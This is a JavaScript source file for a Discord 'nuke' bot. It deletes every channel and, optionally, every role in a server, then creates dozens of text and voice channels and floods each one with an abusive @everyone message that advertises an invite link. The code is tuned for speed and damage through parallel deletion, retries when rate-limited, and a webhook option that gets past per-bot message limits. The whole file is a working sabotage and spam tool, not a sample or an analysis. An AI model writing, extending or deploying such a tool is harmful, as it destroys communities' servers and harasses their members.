import 'dotenv/config';
import {
  Client, GatewayIntentBits, Events, ChannelType, MessageFlags,
  PermissionFlagsBits, Routes,
} from 'discord.js';

/* ------------------------------------------------------------------ config */

const NUKE_MESSAGE =
  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #";

const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';

// false -> "name", "name 1", "name 2", ...
// true  -> "name 1", "name 2", "name 3", ...
const NUMBER_FIRST_CHANNEL = false;

const CATEGORY_NAME = 'general';
const TEXT_COUNT    = 26;
const VOICE_COUNT   = 16;
const SPAM_COUNT    = 45;   // messages per text channel

// also blast the same message into every voice channel's text chat
// ("call messages"). voice chats have their own per-channel rate-limit bucket,
// so this is free extra coverage — it just takes longer to drain.
const VOICE_SPAM       = true;
const VOICE_SPAM_COUNT = 45;   // messages per voice channel

// optional: role NAME that may also nuke (admins always can). now read from .env
const NUKE_ROLE_NAME = process.env.NUKE_ROLE_NAME ?? '';

/* --------------------------------------------------------- speed knobs */

// how many ops run at the exact same time. discord.js queues + backs off 429s
// per bucket, so these are just "how wide do we fire", not rate-limit values.
const DELETE_CONCURRENCY = 10;  // channel/role deletions in flight
const CREATE_CONCURRENCY = 5;   // channel creations in flight

// 0 = fire all SPAM_COUNT at once and let the REST queue meter them (fastest).
// set e.g. 10 if you want visible batching instead.
const SPAM_BURST = 0;

// true = split every channel's spam between the bot AND a per-channel webhook.
// bot = 5 msg / 5s per channel, webhook = 5 msg / 2s per webhook -> two
// independent buckets, roughly 2.5x faster overall. messages then show as a
// "nuke" webhook instead of your bot. set WEBHOOK_RATIO to taste.
const USE_WEBHOOKS = false;
const WEBHOOK_RATIO = 0.5;

const sleep = ms => new Promise(r => setTimeout(r, ms));

function channelName(i) {
  const n = NUMBER_FIRST_CHANNEL ? i + 1 : i;
  return n === 0 ? CHANNEL_BASE : `${CHANNEL_BASE} ${n}`;
}

// run `worker` over `items` with a fixed concurrency ceiling
async function pool(items, limit, worker) {
  let i = 0;
  const n = Math.max(1, Math.min(limit, items.length));
  await Promise.all(
    Array.from({ length: n }, async () => {
      while (i < items.length) {
        const idx = i++;
        await worker(items[idx], idx);
      }
    })
  );
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds],
  rest: { retries: 5, timeout: 30_000 },   // ride out long channel-create 429s
});

/* --------------------------------------------------------------- senders */

// sender = { channel } or { webhook: url }
async function sendSafe(sender, content, retries = 6) {
  try {
    if (sender.webhook) {
      await client.rest.post(sender.webhook, {
        body: { content, allowed_mentions: { parse: ['everyone'] } },
        query: { wait: 'false' },           // don't wait for the message object
      });
    } else {
      await sender.channel.send({ content });
    }
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000) + 120;
      await sleep(wait);
      return sendSafe(sender, content, retries - 1);
    }
    if (status === 404) return;             // channel/webhook got deleted
    if (status === 403) return;             // voice channel with text chat disabled
    console.error('[send]', err.message);
  }
}

async function createSafe(guild, options, retries = 6) {
  try {
    return await guild.channels.create(options);
  } catch (err) {
    const status = err?.status ?? err?.httpStatus;
    if (status === 429 && retries > 0) {
      const wait = ((err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000) + 120;
      await sleep(wait);
      return createSafe(guild, options, retries - 1);
    }
    throw err;
  }
}

/* ------------------------------------------------------------------ spam */

// fires every send for ONE channel without awaiting them one by one
async function spamChannel(channel, count = SPAM_COUNT) {
  const senders = [];

  if (USE_WEBHOOKS) {
    try {
      const hook = await client.rest.post(Routes.channelWebhooks(channel.id), {
        body: { name: 'nuke' },
      });
      senders.push({
        webhook: `https://discord.com/api/v10/webhooks/${hook.id}/${hook.token}`,
      });
    } catch (err) {
      console.error('[webhook]', channel.name, err.message);
    }
  }

  senders.push({ channel });

  const jobs = [];
  for (let i = 0; i < count; i++) {
    jobs.push(sendSafe(senders[i % senders.length], NUKE_MESSAGE));
  }

  if (SPAM_BURST > 0) {
    for (let i = 0; i < jobs.length; i += SPAM_BURST) {
      await Promise.all(jobs.slice(i, i + SPAM_BURST));
    }
  } else {
    await Promise.all(jobs);
  }
}

/* ------------------------------------------------------------------ events */

client.once(Events.ClientReady, c => {
  console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
});

client.on(Events.Error, err => console.error('[client]', err));

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;

  try {
    if (interaction.commandName === 'help') return await help(interaction);
    if (interaction.commandName === 'nuke') return await nuke(interaction);
  } catch (err) {
    console.error(err);
    const payload = { content: `Error: \`${err.message}\``, flags: MessageFlags.Ephemeral };
    if (interaction.deferred || interaction.replied) {
      await interaction.editReply(payload).catch(() => {});
    } else {
      await interaction.reply(payload).catch(() => {});
    }
  }
});

/* ---------------------------------------------------------------- commands */

async function help(interaction) {
  return interaction.reply({
    content: [
      '**Commands**',
      '`/nuke [roles]` — delete every channel and rebuild the server',
      '`/help` — this message',
      '',
      'Only **Administrators** can run `/nuke`.',
    ].join('\n'),
    flags: MessageFlags.Ephemeral,
  });
}

async function nuke(interaction) {
  const { guild } = interaction;
  if (!guild) {
    return interaction.reply({ content: 'Run this inside a server.', flags: MessageFlags.Ephemeral });
  }

  const isAdmin = interaction.memberPermissions.has(PermissionFlagsBits.Administrator);
  const hasRole =
    !!NUKE_ROLE_NAME &&
    interaction.member.roles.cache.some(
      r => r.name.toLowerCase() === NUKE_ROLE_NAME.toLowerCase()
    );

  if (!isAdmin && !hasRole) {
    return interaction.reply({
      content: 'You need **Administrator** (or the nuke role) to do this.',
      flags: MessageFlags.Ephemeral,
    });
  }

  const wipeRoles = interaction.options.getBoolean('roles') ?? false;

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const me = guild.members.me;
  if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
    return interaction.editReply('I need the **Manage Channels** permission.');
  }

  const t0 = Date.now();
  const log = m => console.log(`[nuke +${Date.now() - t0}ms] ${m}`);

  /* 1. roles (optional) — all in flight at once */
  if (wipeRoles) {
    if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      log('skipping roles: missing Manage Roles');
    } else {
      const roles = [...guild.roles.cache.values()].filter(
        r => !r.managed && r.id !== guild.id && r.comparePositionTo(me.roles.highest) < 0
      );
      await pool(roles, DELETE_CONCURRENCY, r =>
        r.delete().catch(e => console.error('[role]', r.name, e.message))
      );
      log(`deleted ${roles.length} roles`);
    }
  }

  /* 2. wipe everything in parallel — fetch first so big guilds are complete */
  const existing = await guild.channels.fetch().catch(() => guild.channels.cache);
  await pool([...existing.values()], DELETE_CONCURRENCY, c =>
    c.delete().catch(e => console.error('[delete]', c.name, e.message))
  );
  log(`deleted ${existing.size} channels`);

  /* 3. category (must exist before its children) */
  const category = await createSafe(guild, {
    name: CATEGORY_NAME,
    type: ChannelType.GuildCategory,
  });

  /* 4. create + spam PIPELINE: each text channel starts blasting the moment it
        exists, while the remaining channels are still being created. voice
        channels get the same treatment so their text chats ("call messages")
        are filled too. */
  const specs = [
    ...Array.from({ length: TEXT_COUNT },  (_, i) => ({ name: channelName(i), type: ChannelType.GuildText })),
    ...Array.from({ length: VOICE_COUNT }, (_, i) => ({ name: channelName(i), type: ChannelType.GuildVoice })),
  ];

  const spamJobs = [];
  const textChannels = [];
  const voiceChannels = [];

  await pool(specs, CREATE_CONCURRENCY, async spec => {
    const ch = await createSafe(guild, { ...spec, parent: category.id });

    if (spec.type === ChannelType.GuildText) {
      textChannels.push(ch);
      spamJobs.push(spamChannel(ch));                    // <- launched, not awaited
    } else if (spec.type === ChannelType.GuildVoice && VOICE_SPAM) {
      voiceChannels.push(ch);
      spamJobs.push(spamChannel(ch, VOICE_SPAM_COUNT));  // <- the call messages
    }
  });

  log(`rebuilt ${specs.length} channels — ${spamJobs.length} spam jobs running`);
  await Promise.all(spamJobs);

  const summary =
    `Done in ${((Date.now() - t0) / 1000).toFixed(1)}s — wiped everything, rebuilt ` +
    `${TEXT_COUNT} text + ${VOICE_COUNT} voice, spammed ${SPAM_COUNT}x in ${textChannels.length} ` +
    `text channels + ${VOICE_SPAM_COUNT}x in ${voiceChannels.length} calls.`;
  log(summary);

  // origin channel no longer exists, so the ephemeral reply is gone -> fall back
  await interaction.editReply(summary).catch(async () => {
    await textChannels[0]?.send(summary).catch(() => {});
  });
}

client.login(process.env.DISCORD_TOKEN);
